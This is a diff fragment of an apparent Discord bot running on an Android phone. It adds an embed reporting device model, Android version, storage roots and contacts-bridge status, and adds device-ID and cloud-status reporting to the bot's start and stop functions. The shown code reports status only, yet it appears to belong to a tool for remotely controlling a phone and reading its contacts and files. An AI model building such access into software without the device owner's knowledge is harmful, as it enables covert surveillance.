-    ]
-    if ANDROID.sdk > 0:
-        info.append(f"\n📱 **الطراز:** `{ANDROID.model}`")
-        info.append(f"🏭 **المُصنّع:** `{ANDROID.vendor_name}`")
-        info.append(f"🤖 **أندرويد:** `{ANDROID.release}`")
-        info.append(f"🔧 **SDK:** `{ANDROID.sdk}`")
-    await interaction.followup.send("\n".join(info))
+    embed = _make_embed("💻 معلومات النظام", color=Colors.DEVICE)
+    embed.add_field(
+        name="🖥️ البوت",
+        value=(f"• الاسم: `{DEVICE_NAME}`\n"
+               f"• Python: `{sys.version.split()[0]}`\n"
+               f"• النظام: `{platform.system()} {platform.release()}`\n"
+               f"• النسخة: `v{VERSION}`"),
+        inline=True,
+    )
+    embed.add_field(
+        name="📱 الجهاز",
+        value=(f"• الطراز: `{ANDROID.model or '?'}`\n"
+               f"• المُصنّع: `{ANDROID.vendor_name}`\n"
+               f"• Android: `{ANDROID.release}`\n"
+               f"• SDK: `{ANDROID.sdk}`"),
+        inline=True,
+    )
+    embed.add_field(
+        name="📦 المكونات",
+        value=(f"• Bridge: {'✅' if _BRIDGE_AVAILABLE else '❌'}\n"
+               f"• Cloud: {'✅' if _CLOUD_AVAILABLE else '❌'}\n"
+               f"• Browser: {'✅' if _ADVANCED_BROWSER else '⚠️'}\n"
+               f"• PIL: {'✅' if HAS_PIL else '❌'}\n"
+               f"• Contacts: {'✅' if _is_contacts_ready() else '❌'}"),
+        inline=False,
+    )
+    embed.add_field(
+        name="📁 التخزين",
+        value=(f"• الجذر: `{ALLOWED_ROOT}`\n"
+               f"• الجذور: **{len(DISCOVERED_ROOTS)}**"),
+        inline=False,
+    )
+    embed.add_field(
+        name="⚡ الإحصائيات",
+        value=(f"• Cache: `{LIST_CACHE.size()}`\n"
+               f"• Uptime: `{STATS._fmt_time(STATS.uptime())}`"),
+        inline=True,
+    )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       start_bot / stop_bot / get_bot_status
+#                       Lifecycle API
 # ═══════════════════════════════════════════════════════════════════
 _bot_start_lock = threading.RLock()
+
+
+def _ensure_bot_alive():
+    """يضمن وجود bot صالح. إذا كان مغلقاً → يعيد البناء."""
+    global bot
+    try:
+        if bot.is_closed():
+            log.warning("🔧 Bot is closed — rebuilding...")
+            bot = _create_bot()
+            _ready_called["value"] = False
+            _synced_once["value"] = False
+            log.info("✅ Bot rebuilt")
+    except Exception as e:
+        log.error(f"_ensure_bot_alive failed: {e}")
+    return bot
 
 
 def start_bot(
@@ -3167,12 +3909,18 @@ def start_bot(
     enable_members: bool = False,
     enable_presences: bool = False,
     enable_all_intents: bool = False,
+    context: Any = None,
+    device_id: str = "",
 ) -> str:
+    """نقطة الدخول الرئيسية من Java."""
     global bot
 
     log.info("=" * 60)
     log.info(f"🚀 start_bot() — v{VERSION} ({VERSION_NAME})")
-    log.info(f"👑 owner={owner_id} | guild={guild_id} | allowed={allowed_user_id}")
+    log.info(f"👑 owner={owner_id} | guild={guild_id} | "
+             f"allowed={allowed_user_id}")
+    log.info(f"🆔 device_id={device_id[:8] if device_id else '—'}")
+    log.info(f"📱 context={'✅' if context else '❌'}")
     log.info("=" * 60)
 
     if not token:
@@ -3180,30 +3928,51 @@ def start_bot(
         log.error(msg)
         return msg
 
+    token = str(token).strip()
+    if len(token) < 20:
+        return "❌ التوكن قصير جدًا"
+
+    # إيقاف أي نسخة سابقة
     with _bot_start_lock:
         if STATE.is_running:
             log.warning("⚠️ إيقاف البوت القديم...")
-            _stop_internal()
-            time.sleep(1)
+            try:
+                _stop_internal()
+                time.sleep(1)
+            except Exception as e:
+                log.warning(f"stop previous failed: {e}")
 
+    # حفظ الإعدادات
     with STATE._lock:
-        STATE.token = token.strip()
+        STATE.token = token
         STATE.prefix = prefix or DEFAULT_PREFIX
         STATE.owner_id = int(owner_id) if owner_id else None
         STATE.guild_id = int(guild_id) if guild_id else None
         STATE.allowed_user_id = int(allowed_user_id) if allowed_user_id else None
+        STATE.device_id = device_id or ""
+        STATE.context = context
 
+    # تهيئة cloud_agent (best-effort)
+    if _CLOUD_AVAILABLE and context is not None:
+        try:
+            _cloud.set_context(context)
+            log.info("✅ cloud_agent context set")
+        except Exception as e:
+            log.warning(f"cloud_agent.set_context failed: {e}")
+
+    # إعادة بناء البوت إن لزم
+    _ensure_bot_alive()
     _ready_called["value"] = False
     _synced_once["value"] = False
 
     if STATE.owner_id:
         try:
             bot.owner_id = int(STATE.owner_id)
-            log.info(f"👑 bot.owner_id = {bot.owner_id}")
-        except Exception as e:
-            log.warning(f"owner_id assignment failed: {e}")
+        except Exception:
+            pass
 
     STATE.mark_running()
+    STATS.reset_uptime()
 
     try:
         log.info("▶️ bot.start() starting...")
@@ -3223,12 +3992,10 @@ def start_bot(
         return msg
 
     except discord.PrivilegedIntentsRequired:
-        msg = (
-            "❌ فعّل Privileged Intents:\n"
-            "1. discord.com/developers/applications\n"
-            "2. تطبيقك → Bot\n"
-            "3. فعّل Message Content Intent"
-        )
+        msg = ("❌ فعّل Privileged Intents:\n"
+               "1. discord.com/developers/applications\n"
+               "2. تطبيقك → Bot\n"
+               "3. فعّل Message Content Intent")
         log.error(msg)
         STATE.set_error(msg)
         return msg
@@ -3249,6 +4016,13 @@ def start_bot(
 
     finally:
         STATE.mark_stopped()
+        # Report to cloud (best-effort)
+        if _CLOUD_AVAILABLE and STATE.cloud_reported:
+            try:
+                _cloud.report_bot_running(False)
+                STATE.cloud_reported = False
+            except Exception:
+                pass
 
 
 def _stop_internal():
@@ -3273,6 +4047,13 @@ def stop_bot() -> str:
     try:
         STATE.get_stop_event().set()
         _stop_internal()
+        # Report to cloud
+        if _CLOUD_AVAILABLE and STATE.cloud_reported:
+            try:
+                _cloud.report_bot_running(False)
+                STATE.cloud_reported = False
+            except Exception:
+                pass
         return "✅ تم الإرسال"
     except Exception as e:
         log.exception("stop_bot failed", e)
@@ -3290,6 +4071,7 @@ def get_bot_status() -> Dict[str, Any]:
         uptime = int(time.time() - start) if start else 0
         is_running = STATE.is_running
         last_error = STATE.last_error
+        device_id = STATE.device_id
 
     try:
         user_name = str(bot.user) if bot.user else None
@@ -3309,8 +4091,11 @@ def get_bot_status() -> Dict[str, Any]:
         "version": VERSION,
         "version_name": VERSION_NAME,
         "bridge_available": _BRIDGE_AVAILABLE,
+        "cloud_available": _CLOUD_AVAILABLE,
         "advanced_browser": _ADVANCED_BROWSER,
         "contacts_ready": _is_contacts_ready(),
+        "device_id": device_id,
+        "cloud_reported": STATE.cloud_reported,
     }
 
 
@@ -3319,10 +4104,13 @@ def is_contacts_bridge_ready() -> bool:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       تسجيل أولي
+#                       Registration Log
 # ═══════════════════════════════════════════════════════════════════
 log.info(f"✅ hawkmoth_bot.py v{VERSION} ({VERSION_NAME}) loaded")
-log.info(f"   • bridge:        {_BRIDGE_AVAILABLE}")
-log.info(f"   • advanced_browser: {_ADVANCED_BROWSER}")
-log.info(f"   • PIL:           {HAS_PIL}")
-log.info(f"   • Roots:         {len(DISCOVERED_ROOTS)}")
+log.info(f"   • Commands registered: {len(_command_registry)}")
+log.info(f"   • Events registered:   {len(_event_handlers)}")
+log.info(f"   • bridge:              {_BRIDGE_AVAILABLE}")
+log.info(f"   • cloud_agent:         {_CLOUD_AVAILABLE}")
+log.info(f"   • advanced_browser:    {_ADVANCED_BROWSER}")
+log.info(f"   • PIL:                 {HAS_PIL}")
+log.info(f"   • Roots:               {len(DISCOVERED_ROOTS)}")
